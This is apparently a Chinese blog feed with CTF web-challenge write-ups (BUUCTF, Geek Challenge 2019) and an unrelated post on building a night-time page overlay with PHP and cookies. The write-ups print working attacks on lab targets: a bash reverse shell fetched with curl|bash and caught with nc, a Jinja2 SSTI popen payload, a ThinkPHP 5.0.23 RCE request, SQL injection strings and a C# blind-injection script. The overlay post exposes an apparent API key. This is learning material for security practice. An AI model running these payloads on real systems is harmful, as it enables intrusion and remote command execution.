<span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微审计了一波，发现很多命令都直接滤掉了，但是题目叫 shell。于是搜了一波反弹shell，找到了<a href="https://www.jianshu.com/p/6aca9b29514d">这个</a>。但是还少了一点东西，就是如何把反弹 shell 的命令传上去，这里找到了两条可行指令，但是靶机没得 wget，所以用 curl。首先把指令写在一个文件里，这里我写在 <code>lemonshell.txt</code> 中，内容如下。这里的端口和 IP 可以在终端中用 <code>ifconfig</code> 查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.93.139&#x2F;8210 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后再用 <code>nc -lvp 8210</code> 监听 <code>8210</code> 端口。回到网页端，审计代码可以得出是要传入一个 <code>girl_friend</code> 的参数，其在一系列过滤之后被执行。所以 POST 参数可以这样写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;When there is wget</span><br><span class="line">girl_friend&#x3D;wget –q –O 174.1.93.139&#x2F;lemonshell.txt|bash</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;When there is no wget, use curl</span><br><span class="line">girl_friend&#x3D;curl 174.1.93.139&#x2F;lemonshell.txt|bash</span><br></pre></td></tr></table></figure><p>如果成功了就能在监听端口的终端看到回显，大概像这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">connect to [174.1.93.139] from 6005-d5c879a9-8350-4539-b26c-f102bcd90b88.1.8tv0l2tbgn7e5fs3p1k8rfnny.ctfd_swarm [174.1.93.128] 43370</span><br><span class="line">bash: cannot set terminal process group (170): Not a tty</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-4.4$</span><br></pre></td></tr></table></figure><p>然后就是找 flag 啦。首先一手 <code>cat /flag</code> 然后没有拿到 flag。于是开始 <code>find / -name flag</code>，一开始没有找到，因为一堆 Permission Denied 我以为没得。然后<a href="https://duitutu.cn">堆堆</a>提醒我说 find 得等比较久。于是等了一会儿，find 返回了这个 <code>/etc/demo/P3rh4ps/love/you/flag</code>，于是顺利拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ed2e8ade-b5d4-4164-8154-6432592a8466&#125;</span><br></pre></td></tr></table></figure><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>一打开页面，一股精致的画风扑面而来(x 随手来了个账号密码登录，发现居然成了，到了 <code>profile.php</code>，然后看了一手源码，发现啥都没有，再看了一手 Cookie 也没有发现，请求头也没有东西。（陷入僵局）</p><p>想到浏览器没办法抓 302 啥的，就打开了 Fiddler，顺手抓了一波登录的包，在跳转页面的响应源码发现了点东西，出现了个 <code>L0g1n.php</code>。于是把它打开，页面提示错误，顺手看了波源码，发现要改 Cookie。照着前面的套路算了一下符合要求的时间的时间戳，用 <code>document.cookie=&quot;time=4740774808&quot;</code> 改完之后刷新。跟着页面提示设置一系列 Header。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Contiki&#x2F;1.0 (Commodore 64; http:&#x2F;&#x2F;dunkels.com&#x2F;adam&#x2F;contiki&#x2F;)</span><br><span class="line">Cookie: time&#x3D;4740774808</span><br><span class="line">via: y1ng.vip</span><br><span class="line">from: root@gem-love.com</span><br><span class="line">referer: gem-love.com</span><br><span class="line">x-real-ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>这样之后会得到 <code>Sorry, even you are good at http header, you&#39;re still not my admin. Althoungh u found me, u still dont know where is flag</code> 的提示，于是看了一波 Fiddler 上的响应，发现了一段注释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ZmxhZ3s1NmVjMTNmZS03Mzk1LTRlY2MtYmIxYS0zMmNjZTQ1NzNjZGZ9Cg==--&gt;</span></span><br></pre></td></tr></table></figure><p>将它 Base64 编码转换之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;56ec13fe-7395-4ecc-bb1a-32cce4573cdf&#125;</span><br></pre></td></tr></table></figure><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p><p>打开页面之后随手输了个 P3，得到的结果是 <code>P3&#39;s girlfirend is : P3</code>。随手看了看网页源代码，发现了 hint <code>&lt;!--ssssssti &amp; a little trick --&gt;</code>，然后尝试着构造了个 <code>&#123;&#123;5 * 7&#125;&#125;</code>，得到了 35 的预期结果，然后再构造了个 <code>&#123;&#123;6 * '7'&#125;&#125;</code> 得到了 777777 的预期结果，所以应该是 Twig/Jinja2 类型的模板。</p><p>先构造一波参数找一下 flag 的位置，<code>.../qaq?name=&#123;&#123; config.__class__.__init__.__globals__['os'].popen('find / -name flag').read() &#125;&#125;</code>，得到的返回值显示 flag 就在根目录。于是直接构造 <code>cat /flag</code> 就能得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure><p><a href="https://duitutu.cn">堆堆</a>跟我说过这题还有个关键字过滤的精髓操作（可惜在 BUUCTF 上没作用了），于是我在这里模拟一下绕过过滤的操作，即将过滤的字符用其他字符替换，这里以 flag =&gt; LEMON 操作。我找到了一个很好用的替换指令：<a href="https://blog.csdn.net/qq_36142062/article/details/80747461">sed</a>。因此，payload 可以这样写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;qaq?name&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag|sed &quot;s&#x2F;flag&#x2F;LEMON&#x2F;g&quot;&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>得到的 flag 会变成这样，就解决了过滤的问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEMON&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure><h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>这题比赛的时候疯狂试了好久，我记得当时好像说不要扫目录来着，结果就没想特殊文件，其实 robots.txt 里面藏着 hint.txt 然后有个提示直接给出了查询的语句 <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code>。但是试了很久发现完全没得回显，除了固定的那一句（说到这里，我想鲨了 HackBar 插件）。查了一波之后知道了反斜杠的套路，然后使用 /**/ 代替空格构造了 <code>username=admin\&amp;password=or/**/ascii(substr(password,1,1))&gt;1#</code> 这样的请求，用某在线工具发送请求之后得到了不一样的结果，于是就上了一波盲注脚本。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> Flurl.Http;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFdo</span> &#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> BEGIN_ASCII = <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> END_ASCII = <span class="number">127</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">string</span> URL = <span class="string">&quot;URL_HERE&quot;</span>;</span><br><span class="line">            <span class="built_in">int</span> position = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                position++;</span><br><span class="line">                <span class="built_in">int</span> _begin = BEGIN_ASCII;</span><br><span class="line">                <span class="built_in">int</span> _end = END_ASCII;</span><br><span class="line">                <span class="keyword">while</span> (_begin &lt; _end)&#123;</span><br><span class="line">                    <span class="built_in">int</span> _mid = (_begin + _end) / <span class="number">2</span>;</span><br><span class="line">                    <span class="built_in">string</span> data = <span class="string">&quot;username=admin\\&amp;password=or/**/ascii(substr(password,&quot;</span> + position + <span class="string">&quot;,1))&gt;&quot;</span> + _mid + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">                    <span class="built_in">string</span> _result = URL.WithHeaders(<span class="keyword">new</span> &#123;Content_Type=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)</span><br><span class="line">                                        .PostStringAsync(data).ReceiveString().Result;</span><br><span class="line">                    <span class="keyword">if</span> (_result.Contains(<span class="string">&quot;BJD needs to be stronger&quot;</span>))&#123;</span><br><span class="line">                        _begin = _mid + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        _end = _mid;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (_begin != BEGIN_ASCII &amp;&amp; _end != END_ASCII)&#123;</span><br><span class="line">                    result += (<span class="built_in">char</span>)_begin;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一番操作得到了密码 <code>OhyOuFOuNdit</code>，登录之后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12781fb2-7b4d-48ff-8540-1cc663189d9a&#125;</span><br></pre></td></tr></table></figure><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>打开页面之后发现 ThinkPHP，这波提示十分明显。于是一套操作，发现报错了，但是拿到了具体的版本号 5.0.23。一顿搜索之后找到了命令执行的 payload。于是抄一波作业，向 <code>.../index.php?s=captcha</code> POST <code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code> 成功发现根目录的 flag。于是再构造一波 <code>cat /flag</code> 就得到了 flag。 这里顺带贴一波参考资料 <a href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/">One</a> <a href="https://blog.csdn.net/qq_38807738/article/details/86777541">Two</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd83ed3-ec7d-4397-9e2c-d06a4245f0e6&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h3><p>氦，这题其实只有一开始的点我是不知道的。<code>ffifdyop</code> 这个字符串被 MD5 摘要之后 hex 转 ASCII 可以构成一个 <code>or</code>，因此可以达成正确的结果。过了这一个点之后可以在下一个页面的源码种找到一段注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这波直接构造 <code>a[]=1&amp;b[]=2</code> 就能通过。第三个页面的 <code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code> 也可用一样的方法绕过，从而得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Md_five_is_fun&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无pjax的整体遮罩折腾记录</title>
      <link href="/zh-CN/posts/c2e31117.html"/>
      <url>/zh-CN/posts/c2e31117.html</url>
      
        <content type="html"><![CDATA[<p>鼓捣 blog 的时候一直觉得夜间模式和阅读模式啥的挺好，Typecho 倒是有插件可以实现，但是 hexo 好像就比较难了，因为我用的主题没有 pjax 的技术，所以每次刷新都可能使这些样式失效。但是我又挺想整一个，于是找到了一个神奇的方案：JavaScript + CSS + PHP + Cookie。</p><p><escape><span id="more"></span></escape></p><h4 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h4><p>使用搜狐的 PV 统计的 API 获取到的 IP，通过 ajax 提交数据，将 IP 映射到大致的经纬度，然后用 PHP 在后端计算日出日落的时间戳，存在 Cookie 里，<del>然后每次刷新用 JavaScript 读取 Cookie 然后判断是否需要渲染遮罩。</del>（依赖 JavaScript 加载会导致每次刷新的时候遮罩没有及时加载而有“闪烁”的效果）通过 PHP 文件读取 Cookie 来判断输出对应的 CSS 样式。</p><h5 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h5><p>在页面中包含部分由 JavaScript 实现的动画的时候，可能会导致元素在动画区间内没有被遮罩覆盖。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="相关接口"><a href="#相关接口" class="headerlink" title="相关接口"></a>相关接口</h5><p>首要解决的问题就是，使用 JavaScript 完成 IP 的获取以及 IP 到经纬度的映射。这里提供两个咱找到的接口。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pv.sohu.com/cityjson?ie=utf-8</span><br></pre></td></tr></table></figure><p>直接使用 script 标签包括并放在页面的 html 代码中，就能得到如下数组。之后可以用 JavaScript 直接读取。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> returnCitySN = &#123;<span class="string">&quot;cip&quot;</span>: <span class="string">&quot;YourIPAddressHere&quot;</span>, <span class="string">&quot;cid&quot;</span>: <span class="string">&quot;cidHere&quot;</span>, <span class="string">&quot;cname&quot;</span>: <span class="string">&quot;YourLocationHere&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>至于 IP 到经纬度的映射，我找到了一个 GeoIP 库，但是速度并不是太快，这也是我使用 Cookie 来存储数据的原因之一——减少请求次数。此接口只需要修改 GET 参数中的 ip 即可。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://api.ipinfodb.com/v3/ip-city/?key=c9dcc88453e33a9e63ebad8d65f91583e87abd8185dd95f09fbeef6c62264f7d&amp;ip=YourIPHere</span><br></pre></td></tr></table></figure><p>返回的结果中会包括大致地点和大致经纬度以及时区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OK;;8.8.8.8;US;United States of America;California;Mountain View;94043;37.406;-122.079;-08:00</span><br></pre></td></tr></table></figure><h5 id="PHP-实现部分"><a href="#PHP-实现部分" class="headerlink" title="PHP 实现部分"></a>PHP 实现部分</h5><h6 id="α-日出日落时间计算"><a href="#α-日出日落时间计算" class="headerlink" title="α. 日出日落时间计算"></a>α. 日出日落时间计算</h6><p>这一部分主要就是根据前端的请求数据映射位置并计算日出日落的时间戳。关于时间戳的计算，PHP 提供了两个现成的函数 <span class="heimu" title="tql">不愧是 PHP</span>。具体请参照 PHP Manual。</p><p><a href="https://www.php.net/manual/zh/function.date-sunrise.php" style="font-family:'JetBrains Mono';font-weight:initial">PHP Manual: data_sunrise()</a></p><p><a href="https://www.php.net/manual/zh/function.date-sunset.php" style="font-family:'JetBrains Mono';font-weight:initial">PHP Manual: data_sunset()</a></p><h6 id="β-CSS-输出部分"><a href="#β-CSS-输出部分" class="headerlink" title="β. CSS 输出部分"></a>β. CSS 输出部分</h6><p>这里首先要做的就是在 hexo 模板文件的你喜欢的位置加入一个 <code>div</code>，并指定一个 <code>div</code>。这样就可以在 CSS 中使用 <code>id</code> 作为筛选器而避免影响到其他元素。因为日出日落时间已经存在 Cookie 里了，所以只需要在 PHP 里读取 Cookie 来判断即可。这里贴上我随便码的代码（真就随便码的，上线测试没几个小时就下线了）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/css; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#layerShade&#123;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;position:fixed;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(time() &gt; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;sunset&#x27;</span>] || time() &lt; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;sunrise&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;background-color:#000;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;background-color:transparent;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;top:0;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;left:0;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;z-index:2147483647;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pointer-events:none;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;opacity:0.33;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;width:100%;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;height:100%;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>主要需要注意的地方就是 <code>header</code>，带上这个才能输出为 text/css，否则是 plain text，就不会被识别成 stylesheet。使用的时候只需要像一般的 CSS 一样用 link 标签在 html 中引用即可。</p><h5 id="JavaScript-实现部分"><a href="#JavaScript-实现部分" class="headerlink" title="JavaScript 实现部分"></a>JavaScript 实现部分</h5><p>由于要使用 JavaScript 来操作 Cookie 和发起请求，所以用 jQuery 会方便不少。因此，可以在模板中加上如下两条语句。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>主要就是判断 Cookie 是否存在、发起请求、保存 Cookie 这样几个步骤，其中的细节不再赘述，直接放上之前测试的时候写的代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> timeNow = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">let</span> timestampNow = timeNow.getTime();</span><br><span class="line"><span class="keyword">if</span>($.cookie(<span class="string">&#x27;sunrise&#x27;</span>) === <span class="literal">undefined</span> || $.cookie(<span class="string">&#x27;sunset&#x27;</span>) === <span class="literal">undefined</span> || returnCitySN[<span class="string">&quot;cip&quot;</span>] !== $.cookie(<span class="string">&#x27;ip&#x27;</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;IsNight? Run!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//request data process</span></span><br><span class="line">    <span class="keyword">var</span> details = &#123;&#125;;</span><br><span class="line">    details[<span class="string">&quot;TIME&quot;</span>] = <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line">    details[<span class="string">&quot;IP_ADDRESS&quot;</span>] = returnCitySN[<span class="string">&quot;cip&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> data = <span class="built_in">JSON</span>.stringify(details);</span><br><span class="line">    data = BASE64.encode(data);</span><br><span class="line">    data = <span class="string">&quot;PLKOZ23476/&quot;</span> + data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//request for sunrise/sunset timestamp</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        url: <span class="string">&quot;https://api.lemonprefect.cn/?&quot;</span> + data,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Setup Cookie expires till the next day</span></span><br><span class="line">            <span class="keyword">let</span> isNigntArray = data.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> timeExpire = <span class="keyword">new</span> <span class="built_in">Date</span>(timeNow.toLocaleDateString()).getTime() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> timeLeftTillExpire = <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> - (timestampNow - timeExpire);</span><br><span class="line">            <span class="keyword">let</span> cookieValidTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            cookieValidTime.setTime(timeLeftTillExpire + timestampNow);</span><br><span class="line">            $.cookie(<span class="string">&#x27;sunrise&#x27;</span>,isNigntArray[<span class="number">0</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">            $.cookie(<span class="string">&#x27;sunset&#x27;</span>,isNigntArray[<span class="number">1</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">            $.cookie(<span class="string">&#x27;ip&#x27;</span>,returnCitySN[<span class="string">&quot;cip&quot;</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Is Night?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> timeNowCompare = <span class="built_in">parseInt</span>(timestampNow / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>(timeNowCompare  &gt; $.cookie(<span class="string">&#x27;sunset&#x27;</span>) || timeNowCompare &lt; $.cookie(<span class="string">&#x27;sunrise&#x27;</span>))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Good Evening!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Maybe it&#x27;s daytime now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timestamp Sunrise:&quot;</span> + $.cookie(<span class="string">&#x27;sunrise&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timestamp Sunset:&quot;</span> + $.cookie(<span class="string">&#x27;sunset&#x27;</span>));</span><br></pre></td></tr></table></figure><p>至此，将所有代码写好之后上线，就能组合在一起正常运作。</p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogModify </tag>
            
            <tag> Layout </tag>
            
            <tag> CSS </tag>
            
            <tag> Script </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2019 WriteUp</title>
      <link href="/zh-CN/posts/50bef630.html"/>
      <url>/zh-CN/posts/50bef630.html</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战2019"><a href="#极客大挑战2019" class="headerlink" title="极客大挑战2019"></a>极客大挑战2019</h2><p>前几天开始了 BUUOJ 的刷题之旅（一方面某些原因菜到有点自闭，一方面 adworld 有点不太稳）本来准备按一波顺序写，但是<a href="https://duitutu.cn">堆堆</a>跟我说起了这个系列题，于是就去刷了一波，感觉还挺好玩。（不愧是一分的水题）</p><h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy SQL"></a>Easy SQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>这题一开始给了个登录的画面，本来以为是像之前春秋的公益赛一样，会先登录然后再在里面放注入的地方。但是无奈怎么都登不上去，于是顺手尝试了一下。<code>.../check.php?username=999%27%20union%20select%201%2C2%20%23&password=999</code></p><p>没想到这随便试的一手试准了，给了一条白色的回显（前排吐槽界面设计）<code>The used SELECT statements have a different number of columns</code> 。拿到这波提示以后就很容易地试出了数据库的列数，最后的 flag 就一下子出来了 （把背景 block 掉的我差点没看见 flag ，还好看了一手网页源代码）<span class="heimu" title="QAQ">红黑白的三色搭配起来真的不好看</span></p><p>PS 我好像写得太复杂了，其实只要登录上就行。所以应该可以用 <code>' or 1=1 #</code> 啥的直接拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 